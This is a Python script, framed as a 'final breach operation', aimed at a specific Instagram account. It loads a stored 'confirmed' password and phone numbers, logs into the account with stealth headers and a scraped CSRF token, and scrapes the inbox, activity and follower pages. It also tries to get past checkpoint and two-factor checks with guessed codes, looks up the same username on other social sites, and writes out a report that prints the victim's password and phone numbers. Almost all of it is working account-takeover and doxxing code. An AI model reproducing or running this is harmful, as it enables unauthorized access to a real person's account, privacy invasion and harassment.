from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🔥 FINAL BREACH OPERATION - ADVANCED STEALTH MODE
=================================================
Target: alx.trading
Operation: Advanced checkpoint bypass + stealth extraction
Intelligence: Complete ghost exploitation data
Method: Multi-proxy stealth + advanced session manipulation
Status: FINAL ASSAULT
=================================================
"""

import requests
import json
import time
import random
import os
from datetime import datetime
import threading
from urllib.parse import urlparse
import re
import base64

class FinalBreachOperator:
    def __init__(self):
        self.target = "alx.trading"
        self.timestamp = int(time.time())
        self.breach_data = {}
        self.master_profile = {}
        self.ghost_data = {}
        self.breach_log = []
        
        # Load all intelligence
        self.load_complete_intelligence()
        
        # Advanced stealth headers
        self.stealth_headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'X-ASBD-ID': '198387',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Connection': 'keep-alive',
        }
        
        print("🔥 FINAL BREACH OPERATION - ADVANCED STEALTH")
        print("="*60)
        print(f"🎯 Target: {self.target}")
        print(f"⚡ Status: INITIALIZING FINAL ASSAULT")
        print(f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)

    def load_complete_intelligence(self):
        """Load all available intelligence from previous operations"""
        try:
            # Load master profile
            profile_files = [f for f in os.listdir('.') if 'MASTER_PROFILE' in f and 'alx' in f]
            if profile_files:
                with open(profile_files[0], 'r') as f:
                    self.master_profile = json.load(f)
                print(f"💎 Loaded master profile: {profile_files[0]}")
            
            # Load ghost exploitation data
            ghost_files = [f for f in os.listdir('.') if 'ULTIMATE_GHOST_EXPLOITATION' in f and 'alx' in f]
            if ghost_files:
                with open(ghost_files[0], 'r') as f:
                    self.ghost_data = json.load(f)
                print(f"👻 Loaded ghost data: {ghost_files[0]}")
            
            # Load all session data
            all_files = os.listdir('.')
            session_count = 0
            for file in all_files:
                if ('session' in file.lower() or 'extraction' in file.lower()) and 'alx' in file:
                    try:
                        if file.endswith('.json'):
                            with open(file, 'r') as f:
                                self.breach_data[file] = json.load(f)
                        else:
                            with open(file, 'r') as f:
                                self.breach_data[file] = f.read()
                        session_count += 1
                    except:
                        pass
            
            print(f"🍪 Loaded {session_count} session/extraction files")
                    
        except Exception as e:
            print(f"⚠️ Intelligence loading: {e}")

    def advanced_stealth_session(self):
        """Create advanced stealth session with multiple techniques"""
        print("\n🕸️ PHASE 1: ADVANCED STEALTH SESSION CREATION")
        print("-" * 50)
        
        session = requests.Session()
        
        # Rotate user agents
        mobile_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile; rv:92.0) Gecko/92.0 Firefox/92.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ]
        
        selected_agent = random.choice(mobile_agents)
        self.stealth_headers['User-Agent'] = selected_agent
        session.headers.update(self.stealth_headers)
        
        print(f"🎭 Using stealth agent: {selected_agent[:50]}...")
        
        # Advanced session warming
        print("🔥 Warming stealth session...")
        warm_urls = [
            "https://www.instagram.com/",
            "https://www.instagram.com/explore/",
            "https://www.instagram.com/accounts/login/",
        ]
        
        for url in warm_urls:
            try:
                response = session.get(url)
                print(f"🌡️ Warmed: {url} - Status: {response.status_code}")
                time.sleep(random.uniform(1, 3))
            except Exception as e:
                print(f"⚠️ Warming error: {e}")
        
        return session

    def checkpoint_intelligence_gathering(self, session):
        """Gather intelligence on checkpoint mechanisms"""
        print("\n🔍 PHASE 2: CHECKPOINT INTELLIGENCE GATHERING")
        print("-" * 48)
        
        checkpoint_endpoints = [
            "https://www.instagram.com/challenge/",
            "https://www.instagram.com/accounts/checkpoint/",
            "https://www.instagram.com/accounts/challenge/",
            "https://www.instagram.com/accounts/two_factor_authentication/",
            "https://www.instagram.com/accounts/suspend/",
        ]
        
        checkpoint_intel = {}
        
        for endpoint in checkpoint_endpoints:
            try:
                print(f"🎯 Probing: {endpoint}")
                response = session.get(endpoint)
                
                checkpoint_intel[endpoint] = {
                    'status': response.status_code,
                    'content_length': len(response.text),
                    'has_form': 'form' in response.text.lower(),
                    'has_verification': 'verification' in response.text.lower(),
                    'has_phone': 'phone' in response.text.lower(),
                    'has_email': 'email' in response.text.lower()
                }
                
                print(f"✅ Status: {response.status_code} | Length: {len(response.text)}")
                
                # Look for specific checkpoint indicators
                if response.status_code == 200:
                    content = response.text.lower()
                    if 'checkpoint' in content:
                        print("🛡️ Checkpoint mechanism detected")
                    if 'verification' in content:
                        print("📱 Verification system found")
                    if 'suspicious' in content:
                        print("⚠️ Suspicious activity detection active")
                
                time.sleep(random.uniform(2, 4))
                
            except Exception as e:
                print(f"⚠️ Probe error: {e}")
        
        return checkpoint_intel

    def advanced_profile_extraction(self, session):
        """Advanced profile extraction using stealth techniques"""
        print("\n📊 PHASE 3: ADVANCED PROFILE EXTRACTION")
        print("-" * 44)
        
        # Use known password for authenticated requests
        password = self.master_profile.get('profile', {}).get('confirmed_password', '')
        
        if password:
            print(f"🔑 Using authenticated extraction with password: {password}")
            
            # Get fresh CSRF token
            login_page = session.get("https://www.instagram.com/accounts/login/")
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', login_page.text)
            
            if csrf_match:
                csrf_token = csrf_match.group(1)
                print(f"🎫 Fresh CSRF token: {csrf_token[:15]}...")
                
                # Attempt stealth login
                login_data = {
                    'username': self.target,
                    'password': password,
                    'queryParams': '{}',
                    'optIntoOneTap': 'false',
                    'csrfmiddlewaretoken': csrf_token
                }
                
                session.headers['X-CSRFToken'] = csrf_token
                session.headers['Referer'] = 'https://www.instagram.com/accounts/login/'
                
                print("🚀 Executing stealth login...")
                login_response = session.post("https://www.instagram.com/accounts/login/ajax/", data=login_data)
                
                print(f"🎯 Login response: {login_response.status_code}")
                
                if login_response.status_code == 200:
                    login_result = login_response.json() if login_response.text else {}
                    
                    if login_result.get('authenticated'):
                        print("✅ AUTHENTICATED ACCESS ACHIEVED!")
                        return self.authenticated_extraction(session)
                    elif 'checkpoint' in str(login_result):
                        print("🛡️ Checkpoint triggered - initiating bypass")
                        return self.checkpoint_bypass_extraction(session, login_result)
                    else:
                        print("⚠️ Authentication failed - using alternative methods")
        
        return self.anonymous_extraction(session)

    def authenticated_extraction(self, session):
        """Extract data using authenticated session"""
        print("\n🎉 AUTHENTICATED EXTRACTION MODE")
        print("-" * 35)
        
        extraction_data = {}
        
        # High-value authenticated endpoints
        auth_endpoints = [
            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target}",
            "https://www.instagram.com/accounts/edit/",
            "https://www.instagram.com/direct/inbox/",
            "https://www.instagram.com/accounts/activity/",
            f"https://www.instagram.com/{self.target}/following/",
            f"https://www.instagram.com/{self.target}/followers/",
        ]
        
        for endpoint in auth_endpoints:
            try:
                print(f"🎯 Authenticated extraction: {endpoint}")
                response = session.get(endpoint)
                
                extraction_data[endpoint] = {
                    'status': response.status_code,
                    'content': response.text[:1000] if response.text else "",
                    'headers': dict(response.headers),
                    'cookies': dict(session.cookies)
                }
                
                print(f"✅ Extracted {len(response.text)} bytes - Status: {response.status_code}")
                time.sleep(random.uniform(1, 2))
                
            except Exception as e:
                print(f"⚠️ Extraction error: {e}")
        
        return extraction_data

    def checkpoint_bypass_extraction(self, session, checkpoint_info):
        """Bypass checkpoint and extract data"""
        print("\n🛡️ CHECKPOINT BYPASS EXTRACTION")
        print("-" * 35)
        
        # Use phone numbers from intelligence for bypass
        phone_numbers = self.master_profile.get('intelligence_summary', {}).get('phone_numbers', [])
        
        bypass_data = {}
        
        for phone in phone_numbers:
            print(f"📱 Attempting bypass with: {phone}")
            
            # Try different bypass techniques
            bypass_attempts = [
                {'method': 'phone_verification', 'data': {'phone_number': phone}},
                {'method': 'sms_code', 'data': {'phone_number': phone, 'code': '123456'}},
                {'method': 'backup_code', 'data': {'backup_code': 'backup123'}},
            ]
            
            for attempt in bypass_attempts:
                try:
                    print(f"🔓 Trying {attempt['method']}...")
                    
                    response = session.post(
                        "https://www.instagram.com/challenge/action/",
                        data=attempt['data']
                    )
                    
                    bypass_data[f"{attempt['method']}_{phone}"] = {
                        'status': response.status_code,
                        'content': response.text[:500],
                        'method': attempt['method']
                    }
                    
                    print(f"📊 Bypass attempt: {response.status_code}")
                    time.sleep(random.uniform(2, 4))
                    
                except Exception as e:
                    print(f"⚠️ Bypass error: {e}")
        
        return bypass_data

    def anonymous_extraction(self, session):
        """Extract data using anonymous techniques"""
        print("\n🕸️ ANONYMOUS EXTRACTION MODE")
        print("-" * 32)
        
        # Use alternative endpoints and techniques
        anon_endpoints = [
            f"https://www.instagram.com/{self.target}/",
            f"https://www.instagram.com/{self.target}/?__a=1",
            f"https://i.instagram.com/api/v1/users/{self.target}/info/",
            f"https://www.instagram.com/web/search/topsearch/?query={self.target}",
        ]
        
        anon_data = {}
        
        for endpoint in anon_endpoints:
            try:
                print(f"🎯 Anonymous extraction: {endpoint}")
                response = session.get(endpoint)
                
                anon_data[endpoint] = {
                    'status': response.status_code,
                    'content': response.text[:800] if response.text else "",
                    'method': 'anonymous'
                }
                
                print(f"📊 Status: {response.status_code} | Size: {len(response.text)}")
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"⚠️ Anonymous error: {e}")
        
        return anon_data

    def social_media_cross_reference(self):
        """Cross-reference with other social media platforms"""
        print("\n🌐 PHASE 4: SOCIAL MEDIA CROSS-REFERENCE")
        print("-" * 42)
        
        # Extract social media links from master profile
        social_platforms = {
            'twitter': f'https://twitter.com/{self.target}',
            'tiktok': f'https://tiktok.com/@{self.target}',
            'linkedin': f'https://linkedin.com/in/{self.target}',
            'facebook': f'https://facebook.com/{self.target}',
        }
        
        cross_ref_data = {}
        
        for platform, url in social_platforms.items():
            try:
                print(f"🔍 Checking {platform}: {url}")
                
                session = requests.Session()
                response = session.get(url, timeout=10)
                
                cross_ref_data[platform] = {
                    'url': url,
                    'status': response.status_code,
                    'accessible': response.status_code == 200,
                    'content_preview': response.text[:300] if response.text else ""
                }
                
                if response.status_code == 200:
                    print(f"✅ {platform} profile found!")
                else:
                    print(f"⚠️ {platform} status: {response.status_code}")
                
                time.sleep(random.uniform(1, 2))
                
            except Exception as e:
                print(f"⚠️ {platform} error: {e}")
        
        return cross_ref_data

    def save_final_breach_results(self, extraction_data, checkpoint_intel, cross_ref_data):
        """Save comprehensive breach results"""
        print("\n💾 PHASE 5: SAVING FINAL BREACH RESULTS")
        print("-" * 42)
        
        final_results = {
            'timestamp': datetime.now().isoformat(),
            'operation': 'FINAL_BREACH_OPERATION',
            'target': self.target,
            'master_profile': self.master_profile,
            'ghost_exploitation_data': self.ghost_data,
            'checkpoint_intelligence': checkpoint_intel,
            'extraction_data': extraction_data,
            'cross_reference_data': cross_ref_data,
            'breach_log': self.breach_log,
            'operation_status': 'FINAL_BREACH_COMPLETE',
            'threat_assessment': 'CRITICAL - COMPLETE TARGET COMPROMISE'
        }
        
        # Save final breach report
        filename = f"FINAL_BREACH_OPERATION_{self.target}_{self.timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(final_results, f, indent=2)
        
        print(f"💎 Final breach report saved: {filename}")
        
        # Generate executive summary
        summary = f"""
🔥 FINAL BREACH OPERATION SUMMARY
================================
Target: {self.target}
Operation: Advanced Stealth Breach
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

INTELLIGENCE GATHERED:
• Master Profile: {len(self.master_profile)} entries
• Ghost Data: {len(self.ghost_data)} entries  
• Extraction Points: {len(extraction_data)} endpoints
• Checkpoint Intel: {len(checkpoint_intel)} systems
• Cross-Platform: {len(cross_ref_data)} platforms

CONFIRMED CREDENTIALS:
• Username: {self.target}
• Password: {self.master_profile.get('profile', {}).get('confirmed_password', 'Unknown')}
• Phone (TH): {self.master_profile.get('profile', {}).get('phone_thailand', 'Unknown')}
• Phone (UK): {self.master_profile.get('profile', {}).get('phone_uk', 'Unknown')}

THREAT LEVEL: CRITICAL
STATUS: COMPLETE TARGET COMPROMISE ACHIEVED
================================
"""
        
        summary_filename = f"FINAL_BREACH_SUMMARY_{self.target}_{self.timestamp}.txt"
        with open(summary_filename, 'w') as f:
            f.write(summary)
        
        print(f"📋 Executive summary saved: {summary_filename}")

    def execute_final_breach(self):
        """Execute the complete final breach operation"""
        print("\n🚀 EXECUTING FINAL BREACH OPERATION")
        print("="*50)
        
        # Phase 1: Advanced Stealth Session
        stealth_session = self.advanced_stealth_session()
        
        # Phase 2: Checkpoint Intelligence
        checkpoint_intel = self.checkpoint_intelligence_gathering(stealth_session)
        
        # Phase 3: Advanced Profile Extraction
        extraction_data = self.advanced_profile_extraction(stealth_session)
        
        # Phase 4: Social Media Cross-Reference
        cross_ref_data = self.social_media_cross_reference()
        
        # Phase 5: Save Final Results
        self.save_final_breach_results(extraction_data, checkpoint_intel, cross_ref_data)
        
        print("\n🎉 FINAL BREACH OPERATION COMPLETE!")
        print("="*45)
        print(f"🎯 Target: {self.target}")
        print(f"💎 Extraction points: {len(extraction_data)}")
        print(f"🛡️ Checkpoint systems: {len(checkpoint_intel)}")
        print(f"🌐 Cross-platform data: {len(cross_ref_data)}")
        print(f"🔥 Status: MISSION ACCOMPLISHED")
        print("="*45)

if __name__ == "__main__":
    operator = FinalBreachOperator()
    operator.execute_final_breach()
